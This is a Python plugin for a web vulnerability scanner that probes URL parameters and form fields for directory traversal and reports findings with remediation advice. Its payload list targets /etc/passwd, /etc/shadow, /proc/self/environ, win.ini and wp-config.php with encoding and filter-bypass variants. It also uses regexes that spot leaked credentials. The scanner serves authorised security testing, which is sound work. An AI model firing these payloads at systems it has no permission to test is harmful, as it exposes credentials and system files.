"""
Web Vulnerability Scanner - Directory Traversal Plugin

This plugin tests for directory traversal/path traversal vulnerabilities by:
1. Identifying path-related parameters in URLs and forms
2. Testing each parameter with directory traversal payloads
3. Analyzing responses to detect successful path traversal
"""

import logging
import re
from typing import Dict, List, Any, Set, Optional
from urllib.parse import urlparse, parse_qs, urlencode, unquote

import requests
from bs4 import BeautifulSoup

from plugins.base import Plugin
from scanner.http_client import HttpClient
from scanner.parser import HtmlParser, FormData
from scanner.reporter import Finding, Severity, Reporter

# Configure logging
logger = logging.getLogger('plugins.directory_traversal')

class DirectoryTraversalPlugin(Plugin):
    """
    Plugin for detecting directory traversal/path traversal vulnerabilities.
    """
    
    name = "directory_traversal"
    description = "Tests for directory/path traversal vulnerabilities in parameters and forms"
    
    # Path traversal test payloads
    PATH_TRAVERSAL_PAYLOADS = [
        # Basic traversals
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        
        # Windows variations
        "..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\..\\..\\windows\\win.ini",
        
        # URL encoded
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
        
        # Double URL encoded
        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        
        # Mixed encoding
        "..%2f..%2f..%2fetc%2fpasswd",
        "..%5c..%5c..%5cwindows%5cwin.ini",
        
        # Nested traversals
        ".../.../.../etc/passwd",
        "....//....//....//etc/passwd",
        
        # Bypassing filters
        "..././..././..././etc/passwd",
        "..///..///..///etc/passwd",
        
        # Null byte injection (for null-terminated languages)
        "../../../etc/passwd%00.jpg",
        "../../../etc/passwd%00.png",
        
        # Alternate encodings
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",  # UTF-8 overlong encoding
        
        # Non-standard path separators
        "../\\../\\../\\etc/passwd",
        
        # Common target files for Windows
        "../../../../windows/system32/drivers/etc/hosts",
        "../../../../boot.ini",
        
        # Common target files for Linux/Unix
        "../../../../etc/shadow",
        "../../../../etc/profile",
        "../../../../proc/self/environ",
        "../../../../var/log/apache2/access.log",
        
        # Web server configuration files
        "../../../../usr/local/etc/apache22/httpd.conf",
        "../../../../usr/local/apache/conf/httpd.conf",
        "../../../../etc/httpd/conf/httpd.conf",
        "../../../../opt/lampp/etc/httpd.conf",
        "../../../../xampp/apache/conf/httpd.conf",
        
        # Web application files
        "../../../../config.php",
        "../../../../configuration.php",
        "../../../../wp-config.php"
    ]
    
    # Parameters that are commonly vulnerable to path traversal
    COMMON_VULNERABLE_PARAMS = {
        'path', 'file', 'document', 'folder', 'root', 'filename', 'load',
        'locate', 'doc', 'page', 'show', 'site', 'type', 'view', 'content',
        'include', 'dir', 'img', 'image', 'download', 'src', 'source',
        'display', 'template', 'php_path', 'style', 'default', 'data',
        'inc', 'read', 'fetch', 'preview', 'id', 'main'
    }
    
    # Patterns that might indicate a successful path traversal
    SUCCESS_PATTERNS = [
        # Unix /etc/passwd patterns
        r"root:.*?:0:0:",
        r"bin:.*?:1:1:",
        r"daemon:.*?:2:2:",
        r"nobody:.*?:99:99:",
        r"http:.*?:80:80:",
        
        # Windows patterns
        r"\[extensions\]",
        r"; for 16-bit app support",
        r"MSDOS=msdos.sys",
        r"files=",
        r"\[MCI Extensions\]",
        
        # Config file patterns
        r"DB_PASSWORD",
        r"database_password",
        r"password.*=.*",
        r"connectionString",
        r"mysqli?_connect\(", 
        r"define\s*\(\s*['\"](HOST|USER|PASSWORD|DB_NAME)",
        r"<VirtualHost",
        r"<Directory ",
        
        # Log file patterns
        r"\d+\.\d+\.\d+\.\d+ - - \[\d+/\w+/\d+:\d+:\d+:\d+ [\+\-]\d+\]",  # Common log format
        r"GET .*? HTTP/1\.[01]",
        r"POST .*? HTTP/1\.[01]",
        
        # Generic indicators
        r"Permission denied",
        r"failed to open stream",
        r"such file or directory",
        r"No such file"
    ]
    
    def __init__(self, reporter: Reporter = None):
        """Initialize the directory traversal plugin."""
        super().__init__(reporter)
        self.tested_urls: Set[str] = set()  # Track already tested URLs to avoid duplication
    
    def scan(self, target_url: str, http_client: HttpClient) -> List[Finding]:
        """
        Scan for directory traversal vulnerabilities.
        
        Args:
            target_url: URL to scan
            http_client: HTTP client for making requests
            
        Returns:
            List[Finding]: List of findings
        """
        findings = []
        
        # Skip if already tested
        if target_url in self.tested_urls:
            return findings
        
        # Add to tested URLs
        self.tested_urls.add(target_url)
        
        self.logger.info(f"Scanning {target_url} for directory traversal vulnerabilities")
        
        try:
            # Test URL parameters
            url_findings = self._test_url_parameters(target_url, http_client)
            findings.extend(url_findings)
            
            # Get the response and parse the page
            response = http_client.get(target_url)
            if not response.ok:
                self.logger.warning(f"Failed to fetch {target_url}: {response.status_code}")
                return findings
            
            # Parse HTML
            parser = HtmlParser(target_url)
            soup = parser.parse_html(response.text)
            
            # Extract and test forms
            forms = parser.extract_forms(soup, target_url)
            form_findings = self._test_forms(forms, http_client)
            findings.extend(form_findings)
            
        except Exception as e:
            self.logger.error(f"Error scanning {target_url} for directory traversal: {e}")
        
        # Report findings
        for finding in findings:
            self.report_finding(finding)
        
        return findings
    
    def _test_url_parameters(self, url: str, http_client: HttpClient) -> List[Finding]:
        """
        Test URL parameters for directory traversal vulnerabilities.
        
        Args:
            url: URL to test
            http_client: HTTP client for making requests
            
        Returns:
            List[Finding]: List of findings
        """
        findings = []
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        if not query_params:
            return findings
        
        # Get baseline response
        try:
            baseline_response = http_client.get(url)
            baseline_content = baseline_response.text
            baseline_status = baseline_response.status_code
        except Exception as e:
            self.logger.error(f"Error getting baseline response for {url}: {e}")
            return findings
        
        # Test each parameter
        for param, values in query_params.items():
            # Skip testing if param doesn't seem vulnerable
            if not self._is_likely_vulnerable(param):
                continue
                
            # Original value
            original_value = values[0] if values else ""
            
            # Test each payload
            for payload in self.PATH_TRAVERSAL_PAYLOADS:
                # Create a new URL with the path traversal payload
                new_params = query_params.copy()
                new_params[param] = [payload]
                query_string = urlencode(new_params, doseq=True)
                
                path = parsed_url.path or '/'
                new_url = f"{parsed_url.scheme}://{parsed_url.netloc}{path}?{query_string}"
                
                try:
                    # Send the request with the payload
                    response = http_client.get(new_url)
                    
                    # Check for successful path traversal
                    if self._is_successful_traversal(response.text, baseline_content):
                        finding = Finding(
                            title=f"Directory Traversal in URL parameter '{param}'",
                            description=(
                                f"The parameter '{param}' appears to be vulnerable to directory traversal. "
                                f"The application may allow access to arbitrary files on the server."
                            ),
                            url=url,
                            severity=Severity.HIGH,
                            plugin_name=self.name,
                            evidence=f"Payload: {payload}\n\nResponse excerpt:\n{self._extract_evidence(response.text)}",
                            request_data={"url": new_url, "method": "GET"},
                            response_data={"status": response.status_code, "length": len(response.text)},
                            remediation=(
                                "1. Implement proper input validation using a whitelist approach.\n"
                                "2. Use canonicalization to convert paths to a standard format before validation.\n"
                                "3. Use chrooted environments or jailed filesystems if possible.\n"
                                "4. Do not pass user-supplied input directly to filesystem functions.\n"
                                "5. Use permission controls to restrict file access."
                            ),
                            cwe_id="22"  # CWE-22: Path Traversal
                        )
                        findings.append(finding)
                        
                        # Stop testing this parameter after finding a vulnerability
                        break
                        
                except Exception as e:
                    self.logger.error(f"Error testing {new_url} with payload {payload}: {e}")
        
        return findings
    
    def _test_forms(self, forms: List[FormData], http_client: HttpClient) -> List[Finding]:
        """
        Test forms for directory traversal vulnerabilities.
        
        Args:
            forms: List of forms to test
            http_client: HTTP client for making requests
            
        Returns:
            List[Finding]: List of findings
        """
        findings = []
        
        for form in forms:
            # Skip forms with no inputs
            if not form.inputs:
                continue
            
            # Prepare form data
            form_data = {}
            vulnerable_fields = []
            
            for input_name, attrs in form.inputs.items():
                # Skip non-text inputs
                input_type = attrs.get('type', 'text').lower()
                if input_type in ['checkbox', 'radio', 'button', 'submit', 'image', 'file']:
                    continue
                
                # Add empty value
                form_data[input_name] = ''
                
                # Mark as vulnerable if it seems likely
                if self._is_likely_vulnerable(input_name):
                    vulnerable_fields.append(input_name)
            
            # Skip if no vulnerable fields
            if not vulnerable_fields:
                continue
            
            # Get baseline response by submitting the form with empty values
            try:
                if form.method.upper() == 'POST':
                    baseline_response = http_client.post(form.action, data=form_data)
                else:
                    query_string = urlencode(form_data)
                    url = f"{form.action}?{query_string}" if '?' not in form.action else f"{form.action}&{query_string}"
                    baseline_response = http_client.get(url)
                
                baseline_content = baseline_response.text
            except Exception as e:
                self.logger.error(f"Error getting baseline response for form {form.action}: {e}")
                continue
            
            # Test each vulnerable field
            for input_name in vulnerable_fields:
                # Test each payload
                for payload in self.PATH_TRAVERSAL_PAYLOADS:
                    # Create new form data with the payload
                    test_data = form_data.copy()
                    test_data[input_name] = payload
                    
                    try:
                        # Send the request with the payload
                        if form.method.upper() == 'POST':
                            response = http_client.post(form.action, data=test_data)
                        else:
                            query_string = urlencode(test_data)
                            url = f"{form.action}?{query_string}" if '?' not in form.action else f"{form.action}&{query_string}"
                            response = http_client.get(url)
                        
                        # Check for successful path traversal
                        if self._is_successful_traversal(response.text, baseline_content):
                            finding = Finding(
                                title=f"Directory Traversal in form field '{input_name}'",
                                description=(
                                    f"The form field '{input_name}' on {form.action} appears to be vulnerable "
                                    f"to directory traversal. The application may allow access to arbitrary "
                                    f"files on the server."
                                ),
                                url=form.action,
                                severity=Severity.HIGH,
                                plugin_name=self.name,
                                evidence=f"Form method: {form.method}\nField: {input_name}\nPayload: {payload}\n\n"
                                         f"Response excerpt:\n{self._extract_evidence(response.text)}",
                                request_data={"url": form.action, "method": form.method, "data": test_data},
                                response_data={"status": response.status_code, "length": len(response.text)},
                                remediation=(
                                    "1. Implement proper input validation using a whitelist approach.\n"
                                    "2. Use canonicalization to convert paths to a standard format before validation.\n"
                                    "3. Use chrooted environments or jailed filesystems if possible.\n"
                                    "4. Do not pass user-supplied input directly to filesystem functions.\n"
                                    "5. Use permission controls to restrict file access."
                                ),
                                cwe_id="22"  # CWE-22: Path Traversal
                            )
                            findings.append(finding)
                            
                            # Stop testing this field after finding a vulnerability
                            break
                            
                    except Exception as e:
                        self.logger.error(f"Error testing form {form.action} field {input_name} with payload {payload}: {e}")
        
        return findings
    
    def _is_successful_traversal(self, response_content: str, baseline_content: str) -> bool:
        """
        Check if the path traversal was successful.
        
        Args:
            response_content: Response content to check
            baseline_content: Baseline response content for comparison
            
        Returns:
            bool: True if path traversal was successful, False otherwise
        """
        # Skip empty responses
        if not response_content:
            return False
            
        # Skip if response is identical to baseline
        if response_content == baseline_content:
            return False
            
        # Check for specific success patterns
        for pattern in self.SUCCESS_PATTERNS:
            if re.search(pattern, response_content, re.MULTILINE):
                return True
        
        # Look for significant differences that might indicate success
        # Check if response contains system paths
        if re.search(r'/(?:etc|var|usr|bin|sbin|home|proc|sys)/', response_content):
            return True
            
        # Check for Windows system paths
        if re.search(r'[A-Z]:\\Windows\\', response_content, re.IGNORECASE):
            return True
            
        # Check for common directory content patterns
        if re.search(r'Directory of [A-Z]:\\', response_content, re.IGNORECASE):
            return True
            
        return False
    
    def _extract_evidence(self, content: str, context_length: int = 500) -> str:
        """
        Extract evidence from the response content.
        
        Args:
            content: Response content
            context_length: Maximum length of evidence to extract
            
        Returns:
            str: Evidence excerpt
        """
        # First try to extract content matching success patterns
        for pattern in self.SUCCESS_PATTERNS:
            match = re.search(pattern, content, re.MULTILINE)
            if match:
                start = max(0, match.start() - 100)
                end = min(len(content), match.end() + 100)
                return content[start:end].strip()
        
        # If no specific pattern matched, extract a reasonable portion from the start
        # (path traversal attacks often reveal file content from the beginning)
        return content[:context_length].strip()
    
    def _is_likely_vulnerable(self, param_name: str) -> bool:
        """
        Determine if a parameter is likely vulnerable to path traversal.
        
        Args:
            param_name: Name of the parameter
            
        Returns:
            bool: True if parameter is likely vulnerable, False otherwise
        """
        param_lower = param_name.lower()
        
        # Common vulnerable parameter names
        if param_lower in self.COMMON_VULNERABLE_PARAMS:
            return True
            
        # Parameters that often contain file paths
        if any(name in param_lower for name in ['path', 'file', 'dir', 'folder', 'include', 'require', 'location']):
            return True
            
        # Parameters related to URLs/resources
        if any(name in param_lower for name in ['url', 'link', 'src', 'href', 'resource']):
            return True
            
        # Parameters with file extension hints
        if param_lower.endswith(('_path', '_file', '_dir', '_page', '_include')):
            return True
            
        # Default to non-vulnerable for other parameters
        return False
